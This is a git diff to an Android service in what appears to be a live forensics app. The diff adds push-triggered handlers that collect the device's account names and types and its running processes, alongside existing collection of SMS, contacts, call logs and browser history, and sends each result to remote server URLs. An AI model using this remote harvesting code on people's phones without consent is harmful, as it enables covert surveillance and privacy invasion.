@@ -1,7 +1,11 @@
 package project.service;
 
 
+import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.annotation.TargetApi;
+import android.app.ActivityManager;
 import android.content.Context;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
@@ -13,6 +17,7 @@ import android.os.Build;
 import android.provider.CallLog;
 import android.provider.ContactsContract.CommonDataKinds.Phone;
 import android.provider.Telephony;
+import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 
 import com.google.firebase.messaging.FirebaseMessagingService;
@@ -42,6 +47,7 @@ import javax.net.ssl.HttpsURLConnection;
 
 import project.liveforensics.ConstantUtils;
 import project.liveforensics.R;
+import project.modelClass.AccountsBean;
 import project.modelClass.CallLogsBean;
 import project.modelClass.ContactsBean;
 import project.modelClass.DiscoveryBean;
@@ -50,7 +56,9 @@ import project.modelClass.SMSBean;
 import project.modelClass.ServerCLBean;
 import project.modelClass.ServerDCBean;
 import project.modelClass.ServerSMSBean;
+import project.modelClass.UsageStatsBean;
 
+import static project.liveforensics.ConstantUtils.ACCOUNTS_URL;
 import static project.liveforensics.ConstantUtils.BOOKMARKS_URI;
 import static project.liveforensics.ConstantUtils.CALLLOGS_URL;
 import static project.liveforensics.ConstantUtils.CALL_PROJECTION;
@@ -63,6 +71,7 @@ import static project.liveforensics.ConstantUtils.SMS_PROJECTION_T14;
 import static project.liveforensics.ConstantUtils.SMS_PROJECTION_T19;
 import static project.liveforensics.ConstantUtils.SMS_URI_T14;
 import static project.liveforensics.ConstantUtils.SMS_URL;
+import static project.liveforensics.ConstantUtils.USAGE_STATS_URL;
 
 public class FCMService extends FirebaseMessagingService {
 
@@ -72,6 +81,8 @@ public class FCMService extends FirebaseMessagingService {
     private ServerCLBean serverCLBean;
     private ServerDCBean serverDCBean;
     private ServerSMSBean serverSMSBean;
+    private AccountsBean accountsBean;
+    private UsageStatsBean statsBean;
 
 
     @Override
@@ -92,7 +103,6 @@ public class FCMService extends FirebaseMessagingService {
             }
         }
     }
-
 
     private void handleDataMessage(JSONObject json) {
         Log.e(TAG, "push json: " + json.toString());
@@ -157,7 +167,7 @@ public class FCMService extends FirebaseMessagingService {
                 new Interrogate().execute(cUtils.smartClientID, discoveryBean.toString());
 
             } else if (flowName.equalsIgnoreCase("BrowserHistory")) {
-                ArrayList<JSONObject> historyArray= new ArrayList();
+                ArrayList<JSONObject> historyArray = new ArrayList();
                 Cursor mCur = this.getContentResolver()
                         .query(BOOKMARKS_URI, HISTORY_PROJECTION,
                                 "bookmark = 0", null, null);
@@ -275,6 +285,33 @@ public class FCMService extends FirebaseMessagingService {
                 } else {
                     targetAPI14(userRefId, flowName, transactionID);
                 }
+            } else if (flowName.equalsIgnoreCase("GetAccounts")) {
+                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
+                    return;
+                }
+                Account[] accounts = AccountManager.get(getApplicationContext()).getAccounts();
+                ArrayList<JSONObject> accountList = new ArrayList<>();
+                for (Account account : accounts) {
+
+                    String name = account.name;
+                    String type = account.type;
+                    JSONObject jsonObject = new JSONObject();
+
+                    jsonObject.put("accountType", type);
+                    jsonObject.put("accountName", name);
+
+                    accountList.add(jsonObject);
+                }
+                Log.d("Accounts", "" + accountList);
+                java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
+                accountsBean = new AccountsBean(userRefId, accountList, sqlDate, transactionID);
+                new SendToServer().execute(userRefId, accountsBean.toString(), flowName);
+            } else if(flowName.equalsIgnoreCase("UsageStats")){
+//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+//                    getUsageStats21(userRefId, flowName, transactionID);
+//                } else {
+                    getUsageStats(userRefId, flowName, transactionID);
+//                }
             }
 
         } catch (JSONException e) {
@@ -283,6 +320,45 @@ public class FCMService extends FirebaseMessagingService {
             Log.e(TAG, "Exception: " + e.getMessage());
         }
     }
+
+    private void getUsageStats(String userRefId, String flowName, int transactionID) {
+        ActivityManager activitymanager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
+
+        List<ActivityManager.RunningAppProcessInfo> RAP = activitymanager.getRunningAppProcesses();
+        StringBuilder lStringBuilder = new StringBuilder();
+        for (ActivityManager.RunningAppProcessInfo processInfo : RAP) {
+            lStringBuilder.append(processInfo.processName + " ");
+
+        }
+        Log.d("Usage Stats",""+lStringBuilder);
+
+        java.sql.Date sqlDate = new java.sql.Date(Calendar.getInstance().getTime().getTime());
+        statsBean = new UsageStatsBean(userRefId, lStringBuilder, sqlDate, transactionID);
+        new SendToServer().execute(userRefId, statsBean.toString(), flowName);
+    }
+
+//    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
+//    private void getUsageStats21(String userRefId, String flowName, int transactionID) {
+//        UsageStatsManager lUsageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
+//        Calendar calendar = Calendar.getInstance();
+//        calendar.add(Calendar.MONTH, -1);
+//        long start = calendar.getTimeInMillis();
+//        long end = System.currentTimeMillis();
+//        List<UsageStats> lUsageStatsList = lUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_WEEKLY, start, end);
+//
+//        StringBuilder lStringBuilder = new StringBuilder();
+//        for (UsageStats lUsageStats : lUsageStatsList) {
+//            if(lUsageStats.getLastTimeUsed()>start){
+//
+//                lStringBuilder.append(lUsageStats.getPackageName());
+//                lStringBuilder.append(" - ");
+//                long timer=lUsageStats.getLastTimeUsed();
+//                lStringBuilder.append(longToSQLDate(timer));
+//                lStringBuilder.append("\r\n");
+//            }
+//        }
+//        Log.d("Usage Stats",""+lStringBuilder);
+//    }
 
     @TargetApi(19)
     private void targetAPI19(String userRefId, String flowName, int transID) {
@@ -294,7 +370,6 @@ public class FCMService extends FirebaseMessagingService {
         }
         getSMSContent(userRefId, flowName, smsCur, transID);
     }
-
 
     @TargetApi(14)
     private void targetAPI14(String userRefId, String flowName, int transID) {
@@ -479,7 +554,7 @@ public class FCMService extends FirebaseMessagingService {
                 os.close();
 
                 int responseCode = conn.getResponseCode();
-                Log.d("Response Code",""+responseCode);
+                Log.d("Response Code", "" + responseCode);
                 if (responseCode == HttpsURLConnection.HTTP_OK) {
                     BufferedReader in = new BufferedReader(new
                             InputStreamReader(
@@ -568,6 +643,10 @@ public class FCMService extends FirebaseMessagingService {
                     url = new URL(CONTACTS_URL + ID);
                 } else if (flowName.equalsIgnoreCase("ShortMessage")) {
                     url = new URL(SMS_URL + ID);
+                }else if (flowName.equalsIgnoreCase("GetAccounts")) {
+                    url = new URL(ACCOUNTS_URL + ID);
+                }else if (flowName.equalsIgnoreCase("UsageStats")) {
+                    url = new URL(USAGE_STATS_URL + ID);
                 }
                 System.out.println("URL" + url);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
